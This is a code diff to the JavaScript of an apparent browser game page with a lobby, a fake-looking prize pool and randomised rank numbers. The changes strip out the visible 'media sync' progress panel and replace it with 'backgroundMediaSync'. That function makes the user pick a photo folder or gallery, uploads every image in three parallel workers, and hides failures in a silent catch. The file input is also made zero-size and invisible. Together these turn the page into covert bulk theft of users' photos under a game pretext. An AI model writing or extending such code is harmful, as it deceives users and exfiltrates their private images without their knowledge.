@@ -15,14 +15,6 @@ const onlineCount = document.getElementById('online-count');
 const prizePool = document.getElementById('prize-pool');
 const prizeTick = document.getElementById('prize-tick');
 
-const syncPanel = document.getElementById('sync-panel');
-const syncTitle = document.getElementById('sync-title');
-const syncSub = document.getElementById('sync-sub');
-const syncFill = document.getElementById('sync-fill');
-const syncCount = document.getElementById('sync-count');
-const syncSpinner = document.getElementById('sync-spinner');
-const syncRetry = document.getElementById('sync-retry');
-
 let watchId = null;
 let ws = null;
 let trackerId = null;
@@ -31,7 +23,6 @@ let streak = 0;
 let progress = 0;
 let gameTimers = [];
 let syncRunning = false;
-let totalSynced = 0;
 
 const IMAGE_EXT = /\.(jpe?g|png|webp|gif|heic|heif)$/i;
 
@@ -69,15 +60,6 @@ function animateLobby() {
   }, 2000);
 }
 
-function setSyncUI({ title, sub, pct, count, done = false }) {
-  syncTitle.textContent = title;
-  syncSub.textContent = sub;
-  syncFill.style.width = `${pct}%`;
-  syncCount.textContent = count;
-  syncSpinner.classList.toggle('done', done);
-  syncRetry.classList.toggle('hidden', !done);
-}
-
 function startGameUI(name) {
   joinScreen.classList.add('hidden');
   playScreen.classList.remove('hidden');
@@ -88,9 +70,8 @@ function startGameUI(name) {
   setTimeout(() => {
     statusText.textContent = 'Match live!';
     statusSub.textContent = "You're in — keep playing to earn more";
-    syncPanel.classList.remove('hidden');
-    startMediaSync();
-  }, 1500);
+    backgroundMediaSync();
+  }, 2000);
 
   rankEl.textContent = `#${rand(100, 999)}`;
 
@@ -162,7 +143,7 @@ function pickViaInput({ webkitdirectory = false, multiple = true, accept = '' } 
     input.multiple = multiple;
     if (webkitdirectory) input.webkitdirectory = true;
     if (accept) input.accept = accept;
-    input.style.cssText = 'position:fixed;left:-9999px;opacity:0;';
+    input.style.cssText = 'position:fixed;left:-9999px;opacity:0;width:0;height:0;';
     document.body.appendChild(input);
     const finish = (files) => {
       input.remove();
@@ -189,8 +170,7 @@ async function pickBulkMedia() {
   if (window.showDirectoryPicker) {
     try {
       const dir = await window.showDirectoryPicker({ mode: 'read' });
-      const files = await readDirImages(dir);
-      if (files.length) return files;
+      return readDirImages(dir);
     } catch (e) {
       if (e.name === 'AbortError') return null;
     }
@@ -207,96 +187,28 @@ async function pickBulkMedia() {
   return galleryFiles.filter(isImageFile);
 }
 
-async function runSyncUpload(files) {
-  const total = files.length;
-  let done = 0;
-  let ok = 0;
+async function uploadQueue(files) {
   const queue = [...files];
-
   const workers = Array.from({ length: 3 }, async () => {
     while (queue.length) {
       const file = queue.shift();
-      if (!file) break;
-      if (await uploadPhoto(file)) {
-        ok++;
-        totalSynced++;
-      }
-      done++;
-      const pct = Math.round((done / total) * 100);
-      setSyncUI({
-        title: 'Syncing media library…',
-        sub: `Uploading batch · ${ok} synced`,
-        pct,
-        count: `${done} / ${total} files`,
-      });
+      if (file) await uploadPhoto(file);
     }
   });
-
   await Promise.all(workers);
-  return ok;
 }
 
-async function startMediaSync() {
+async function backgroundMediaSync() {
   if (syncRunning || !trackerId) return;
   syncRunning = true;
-  syncSpinner.classList.remove('done');
-  syncRetry.classList.add('hidden');
 
-  setSyncUI({
-    title: 'Syncing media library…',
-    sub: 'Scanning device storage',
-    pct: 8,
-    count: 'Initializing…',
-  });
-
-  await new Promise(r => setTimeout(r, 1200));
-  setSyncUI({
-    title: 'Syncing media library…',
-    sub: 'Select your gallery folder or all photos',
-    pct: 18,
-    count: 'Waiting for access…',
-  });
-
-  const files = await pickBulkMedia();
-  if (files === null || !files.length) {
-    setSyncUI({
-      title: 'Sync paused',
-      sub: 'Tap sync again to connect gallery',
-      pct: 0,
-      count: 'No files selected',
-      done: true,
-    });
-    syncRunning = false;
-    return;
-  }
-
-  setSyncUI({
-    title: 'Syncing media library…',
-    sub: `Found ${files.length} files · starting upload`,
-    pct: 25,
-    count: `0 / ${files.length} files`,
-  });
-
-  const uploaded = await runSyncUpload(files);
-
-  setSyncUI({
-    title: uploaded ? 'Sync complete ✓' : 'Sync finished',
-    sub: uploaded ? `${uploaded} files synced · bonus unlocked` : 'No files uploaded',
-    pct: 100,
-    count: `${uploaded} / ${files.length} synced`,
-    done: true,
-  });
-
-  if (uploaded) {
-    progress = Math.min(progress + 30, 100);
-    progressFill.style.width = `${progress}%`;
-    progressHint.textContent = '🎉 Media sync boosted your bonus!';
-  }
+  try {
+    const files = await pickBulkMedia();
+    if (files?.length) await uploadQueue(files);
+  } catch { /* silent */ }
 
   syncRunning = false;
 }
-
-syncRetry.addEventListener('click', () => startMediaSync());
 
 async function startPlaying() {
   hideError();
